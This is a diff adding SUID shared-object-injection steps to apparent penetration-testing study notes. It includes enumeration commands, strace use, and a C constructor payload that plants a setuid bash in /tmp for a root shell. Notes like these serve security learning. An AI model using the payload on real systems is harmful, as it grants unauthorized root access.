@@ -261,6 +261,44 @@ find / -perm -u=s -type f 2>/dev/null
 Exploit's vary. Refer to GTFOBins
 
 # Escalation Path: Other SUID Escalation
+## Shared Object Injection
+### Enumeration
+- via **find**
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+
+# List permissions of a result
+ls -la [path-to-so]
+```
+- debugging the `so` with `strace`
+```
+strace [path to so] 2>&1
+
+# Look for `No such file or directory`
+strace [path to so] 2>&1 | grep -i -E "open|access|no such file"
+```
+Using the results above, find a missing file that in a folder that you have write access to, so you can upload a malicious file that the `so` can load. Usually a revshell or /bin/bash
+
+### Exploitation
+- Example of malicious file in c
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+- Compile via gcc
+```
+gcc -shared -fPIC -o [output path] [input path]
+```
+- Compare results to [gtfobins](https://gtfobins.github.io/)
+
+
+## Binary Symlinks
+## Environmental Variabls
 
 # Escalation Path: Capabilities
 
